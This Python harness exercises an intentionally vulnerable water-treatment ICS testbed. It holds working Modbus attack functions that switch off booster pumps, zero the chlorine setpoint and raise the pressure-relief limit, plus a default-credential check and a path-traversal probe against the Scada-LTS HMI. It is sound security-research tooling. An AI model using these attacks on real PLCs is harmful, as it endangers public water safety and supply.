#!/usr/bin/env python3
# Copyright 2026 Sam Truss
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# =============================================================================
#  Multi-PLC Water Treatment Testbed - agent / acceptance harness
# -----------------------------------------------------------------------------
#  Exercises the seeded vulnerabilities across all phases of the testbed:
#
#    Phase 1 (OT):   recon of all three PLCs over Modbus, then three attacks
#                    - distribution booster pumps forced OFF
#                    - treatment chlorine setpoint zeroed
#                    - distribution pressure-relief limit raised
#    Phase 2 (HMI):  Scada-LTS reachability, default-credential check, and a
#                    benign detection probe for CVE-2025-13791 (path traversal,
#                    patched in 2.8.0).
#    Phase 3/4 (net): segmentation check - whether the PLCs are reachable
#                    DIRECTLY from the agent's network (i.e. whether a
#                    permissive-firewall condition is in effect).
#
#  This is an acceptance / smoke harness for a self-contained, intentionally
#  vulnerable research testbed. It only ever talks to the testbed's own
#  containers. Modbus targets default to the host-exposed ports so the OT
#  acceptance test works regardless of network segmentation.
#
#  Usage:
#    docker exec agent python /app/modbus_client.py            # full run
#    docker exec agent python /app/modbus_client.py --recon    # recon only
#    docker exec agent python /app/modbus_client.py --no-attack
#    docker exec agent python /app/modbus_client.py --hmi-only
# =============================================================================

import os
import sys
import time
import logging
import argparse

from pymodbus.client import ModbusTcpClient

# Quiet pymodbus' own connection-failure logging (the segmentation check
# deliberately attempts unreachable hosts; those failures are expected).
logging.getLogger("pymodbus").setLevel(logging.CRITICAL)

try:
    import requests
except ImportError:
    requests = None

# --- Targets -----------------------------------------------------------------
# Defaults reach the host-exposed Modbus ports (works on Docker Desktop).
# Override with env vars to target container names directly, e.g. when the
# permissive overlay puts the agent on ot-net:  PLC1_HOST=plc1-intake PLC1_PORT=502
PLC1 = (os.getenv("PLC1_HOST", "host.docker.internal"), int(os.getenv("PLC1_PORT", "5021")))
PLC2 = (os.getenv("PLC2_HOST", "host.docker.internal"), int(os.getenv("PLC2_PORT", "5022")))
PLC3 = (os.getenv("PLC3_HOST", "host.docker.internal"), int(os.getenv("PLC3_PORT", "5023")))

UNIT = int(os.getenv("MODBUS_UNIT", "1"))   # OpenPLC slave/unit id (try 0 if 1 fails)

# OpenPLC maps %MW0 to Modbus HOLDING REGISTER address 1024 (not 0 - that's %QW0).
# All our sensors/setpoints are %MW, so read/write at MW_BASE + offset.
MW_BASE = int(os.getenv("MW_BASE", "1024"))

HMI_URL = os.getenv("HMI_URL", "http://scada-lts:8080/Scada-LTS")
HMI_USER = os.getenv("HMI_USER", "admin")
HMI_PASS = os.getenv("HMI_PASS", "admin")


# --- Low-level helpers -------------------------------------------------------
def connect(host, port):
    c = ModbusTcpClient(host, port=port, timeout=3)
    return c if c.connect() else None


def read_holding(c, addr, count):
    rr = c.read_holding_registers(MW_BASE + addr, count=count, slave=UNIT)
    if rr.isError():
        return None
    return rr.registers


def read_coils(c, addr, count):
    rr = c.read_coils(addr, count=count, slave=UNIT)
    if rr.isError():
        return None
    return rr.bits[:count]


def write_holding(c, addr, value):
    rq = c.write_register(MW_BASE + addr, value, slave=UNIT)
    return not rq.isError()


def write_coil(c, addr, value):
    rq = c.write_coil(addr, value, slave=UNIT)
    return not rq.isError()


def banner(text):
    print("\n" + "=" * 70)
    print(text)
    print("=" * 70)


def poll_until(c, reg_addr, reg_label, coil_addr, alarm_label, timeout=35):
    """Poll a holding register + alarm coil once a second until the alarm
    latches or timeout expires. Prints the sensor trajectory as it changes."""
    deadline = time.time() + timeout
    last = None
    while time.time() < deadline:
        regs = read_holding(c, reg_addr, 1)
        coil = read_coils(c, coil_addr, 1)
        val = regs[0] if regs else None
        alarm = coil[0] if coil else False
        if val != last:
            print(f"      {reg_label}={val}  {alarm_label}={'RAISED' if alarm else 'clear'}")
            last = val
        if alarm:
            print(f"  [+] {alarm_label} RAISED - attack confirmed")
            return True
        time.sleep(1)
    print(f"  [-] {alarm_label} did not latch within {timeout}s")
    return False


# --- Phase 1: recon ----------------------------------------------------------
def recon():
    banner("[1/5] RECON - surveying all three PLCs over Modbus")
    targets = [
        ("PLC1 intake",       PLC1, ["source_level", "tank_level", "intake_flow", "pump_status"]),
        ("PLC2 treatment",    PLC2, ["chlorine_level", "chlorine_setpoint", "ph_level", "ph_setpoint", "dosing_status"]),
        ("PLC3 distribution", PLC3, ["pressure", "pressure_max", "booster1_status", "booster2_status"]),
    ]
    reachable = []
    for name, (host, port), labels in targets:
        c = connect(host, port)
        if not c:
            print(f"  [-] {name:18s} {host}:{port}  UNREACHABLE")
            continue
        regs = read_holding(c, 0, len(labels))
        c.close()
        if regs is None:
            print(f"  [-] {name:18s} {host}:{port}  connected, no register response (try MODBUS_UNIT=0)")
            continue
        reachable.append(name)
        pretty = ", ".join(f"{l}={v}" for l, v in zip(labels, regs))
        print(f"  [+] {name:18s} {host}:{port}  {pretty}")
    print(f"\n  {len(reachable)}/3 PLCs reachable over Modbus, no authentication required.")
    return reachable


# --- Phase 1: attacks --------------------------------------------------------
def attack_pumps_off():
    banner("[2/5] ATTACK - distribution booster pumps forced OFF (denial of supply)")
    c = connect(*PLC3)
    if not c:
        print("  [-] PLC3 unreachable - skipping")
        return
    ok1 = write_coil(c, 0, False)   # booster1_cmd
    ok2 = write_coil(c, 1, False)   # booster2_cmd
    print(f"  [+] booster1_cmd -> OFF ({'ok' if ok1 else 'FAILED'})")
    print(f"  [+] booster2_cmd -> OFF ({'ok' if ok2 else 'FAILED'})")
    print("      watching pressure decay (supply_fail_alarm latches below 100)...")
    poll_until(c, reg_addr=0, reg_label="pressure",
               coil_addr=3, alarm_label="supply_fail_alarm", timeout=35)
    c.close()


def attack_chlorine_zero():
    banner("[3/5] ATTACK - treatment chlorine setpoint zeroed (unsafe water)")
    c = connect(*PLC2)
    if not c:
        print("  [-] PLC2 unreachable - skipping")
        return
    ok = write_holding(c, 1, 0)     # chlorine_setpoint
    print(f"  [+] chlorine_setpoint -> 0 ({'ok' if ok else 'FAILED'})")
    print("      watching chlorine decay (unsafe_water_alarm latches below 50)...")
    poll_until(c, reg_addr=0, reg_label="chlorine_level",
               coil_addr=1, alarm_label="unsafe_water_alarm", timeout=45)
    c.close()


def attack_pressure_relief():
    banner("[4/5] ATTACK - distribution pressure-relief limit raised (overpressure)")
    c = connect(*PLC3)
    if not c:
        print("  [-] PLC3 unreachable - skipping")
        return
    # Re-enable pumps so pressure can climb, then disable relief by raising max.
    write_coil(c, 0, True)
    write_coil(c, 1, True)
    ok = write_holding(c, 1, 1000)  # pressure_max -> above the 900 hard limit
    print(f"  [+] pressure_max -> 1000 ({'ok' if ok else 'FAILED'})  (safe hard limit is 900)")
    print("      watching pressure climb (overpressure_alarm latches above 900)...")
    poll_until(c, reg_addr=0, reg_label="pressure",
               coil_addr=2, alarm_label="overpressure_alarm", timeout=35)
    c.close()


# --- Phase 2: HMI ------------------------------------------------------------
def hmi_probe():
    banner("[5/5] HMI - Scada-LTS reachability, default creds, CVE-2025-13791 probe")
    if requests is None:
        print("  [-] requests not installed - skipping HMI phase")
        return
    base = HMI_URL.rstrip("/")

    # Reachability
    try:
        r = requests.get(base + "/login.htm", timeout=5)
        print(f"  [+] HMI reachable at {base}  (HTTP {r.status_code})")
    except Exception as e:
        print(f"  [-] HMI unreachable: {e}")
        return

    # Default-credential check (Scada-LTS form login)
    try:
        s = requests.Session()
        r = s.post(base + "/j_spring_security_check",
                   data={"username": HMI_USER, "password": HMI_PASS},
                   timeout=5, allow_redirects=False)
        accepted = r.status_code in (302, 200) and "login_error" not in r.headers.get("Location", "")
        print(f"  [{'+' if accepted else '-'}] default credentials {HMI_USER}/{HMI_PASS}: "
              f"{'ACCEPTED' if accepted else 'rejected'}  [vuln #4]")
    except Exception as e:
        print(f"  [-] credential check error: {e}")

    # Benign detection probe for CVE-2025-13791 (path traversal). This only
    # checks whether the vulnerable behaviour is present; it does not exfiltrate
    # anything. Patched in Scada-LTS 2.8.0 (the :latest image), so expect 'patched'.
    try:
        probe = base + "/Scada-BR/../../../etc/hostname"
        r = requests.get(probe, timeout=5)
        vulnerable = r.status_code == 200 and len(r.text) < 256 and "/" not in r.text.strip()
        print(f"  [{'!' if vulnerable else '+'}] CVE-2025-13791 path traversal: "
              f"{'POTENTIALLY VULNERABLE' if vulnerable else 'patched / not exploitable (expected on 2.8.0)'}")
    except Exception as e:
        print(f"  [-] CVE probe error: {e}")


# --- Phase 3/4: segmentation check ------------------------------------------
def segmentation_check():
    banner("NET - segmentation check (can the agent reach OT directly?)")
    direct = [("plc1-intake", 502), ("plc2-treatment", 502), ("plc3-distribution", 502)]
    reachable = 0
    for host, port in direct:
        c = ModbusTcpClient(host, port=port, timeout=2)
        if c.connect():
            reachable += 1
            c.close()
            print(f"  [!] {host}:{port} reachable DIRECTLY from the agent network")
        else:
            print(f"  [+] {host}:{port} blocked (segmentation holding)")
    if reachable == 0:
        print("\n  Segmentation intact: agent cannot reach OT directly - it must pivot")
        print("  through the dual-homed Scada-LTS bridge. (Proper Phase 1-3 posture.)")
    else:
        print(f"\n  PERMISSIVE FIREWALL in effect: {reachable}/3 PLCs directly reachable")
        print("  from the DMZ. This is the Phase 4 vuln #5/#6 condition.")


# --- Driver ------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(description="Multi-PLC Water Treatment Testbed agent")
    ap.add_argument("--recon", action="store_true", help="recon only")
    ap.add_argument("--no-attack", action="store_true", help="skip the OT attacks")
    ap.add_argument("--hmi-only", action="store_true", help="HMI phase only")
    ap.add_argument("--seg-check", action="store_true", help="segmentation check only")
    args = ap.parse_args()

    print("Multi-PLC Water Treatment Testbed - agent harness")
    print("INTENTIONALLY VULNERABLE - isolated research use only.")

    if args.seg_check:
        segmentation_check(); return
    if args.hmi_only:
        hmi_probe(); return

    recon()
    if args.recon:
        return
    if not args.no_attack:
        attack_pumps_off()
        attack_chlorine_zero()
        attack_pressure_relief()
    hmi_probe()
    segmentation_check()
    print("\nDone.")


if __name__ == "__main__":
    sys.exit(main())
